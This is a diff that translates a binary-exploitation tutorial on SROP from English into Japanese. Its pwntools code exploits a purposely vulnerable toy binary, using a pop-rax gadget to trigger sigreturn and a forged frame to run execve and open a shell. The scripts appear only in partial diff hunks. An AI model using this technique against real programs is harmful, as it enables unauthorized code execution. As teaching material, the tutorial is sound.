@@ -1,8 +1,8 @@
 # Using SROP
 
-## Source
+## ソース
 
-As with the [syscalls](../exploitation-with-syscalls.md#the-source), I made the binary using the pwntools ELF features:
+[syscall](../exploitation-with-syscalls.md#the-source) のときと同様に、pwntools の ELF 機能でバイナリを作りました。
 
 ```python
 from pwn import *
@@ -26,17 +26,17 @@ elf = ELF.from_assembly(
 elf.save('vuln')
 ```
 
-It's quite simple - a `read` syscall, followed by a `pop rax; ret` gadget. You can't control RDI/RSI/RDX, which you need to pop a shell, so you'll have to use SROP.
+とても単純で、`read` syscall の後に `pop rax; ret` ガジェットがあるだけです。シェルを起動するのに必要な RDI/RSI/RDX は制御できないので、SROP を使うことになります。
 
-Once again, I added `/bin/sh` to the binary:
+ここでも、バイナリに `/bin/sh` を追加しました。
 
 ```bash
 echo -en "/bin/bash\x00" >> vuln
 ```
 
-## Exploitation
+## エクスプロイト
 
-First let's plonk down the available gadgets and their location, as well as the location of `/bin/sh`.
+まず、使えるガジェットとその位置、そして `/bin/sh` の位置を書き出しておきましょう。
 
 ```python
 from pwn import *
@@ -49,11 +49,11 @@ POP_RAX = 0x41018
 SYSCALL_RET = 0x41015
 ```
 
-From here, I suggest you try the payload yourself. The padding \(as you can see in the assembly\) is `8` bytes until RIP, then you'll need to trigger a `sigreturn`, followed by the values of the registers.
+ここから先は、自分でペイロードを試してみることをおすすめします。パディングは(アセンブリを見れば分かるとおり)RIP まで `8` バイトで、その後に `sigreturn` を起動し、続けてレジスタの値を置きます。
 
 
 
-The triggering of a `sigreturn` is easy - sigreturn is syscall `0xf` \(`15`\), so we just pop that into RAX and call `syscall`:
+`sigreturn` の起動は簡単です。sigreturn は syscall `0xf`(`15`)なので、それを RAX に pop して `syscall` を呼び出します。
 
 ```python
 payload = b'A' * 8
@@ -62,13 +62,13 @@ payload += p64(0xf)
 payload += p64(SYSCALL_RET)
 ```
 
-Now the syscall looks at the location of RSP for the register values; we'll have to fake them. They have to be in a specific order, but luckily for us pwntools has a cool feature called a `SigreturnFrame()` that handles the order for us.
+すると、syscall は RSP の位置にあるレジスタ値を参照します。これを偽装する必要があります。値は決まった順序で並べる必要がありますが、幸い pwntools には `SigreturnFrame()` という便利な機能があり、順序を処理してくれます。
 
 ```text
 frame = SigreturnFrame()
 ```
 
-Now we just need to decide what the register values should be. We want to trigger an `execve()` syscall, so we'll set the registers to the values we need for that:
+あとは、レジスタの値を決めるだけです。`execve()` syscall を起動したいので、そのために必要な値をレジスタに設定します。
 
 ```python
 frame.rax = 0x3b            # syscall number for execve
@@ -77,13 +77,13 @@ frame.rsi = 0x0             # NULL
 frame.rdx = 0x0             # NULL
 ```
 
-However, in order to trigger this we **also have to control RIP** and point it back at the `syscall` gadget, so the execve actually executes:
+ただし、これを起動するには**RIP も制御して**、`syscall` ガジェットに戻るようにして、execve が実際に実行されるようにする必要があります。
 
 ```python
 frame.rip = SYSCALL_RET
 ```
 
-We then append it to the payload and send.
+これをペイロードに追加して送信します。
 
 ```python
 payload += bytes(frame)
@@ -94,7 +94,7 @@ p.interactive()
 
 ![Nailed it!](../../../../.gitbook/assets/image%20%2842%29.png)
 
-### Final Exploit
+### 最終的なエクスプロイト
 
 ```python
 from pwn import *
@@ -122,6 +122,3 @@ payload += bytes(frame)
 p.sendline(payload)
 p.interactive()
 ```
-
-
-
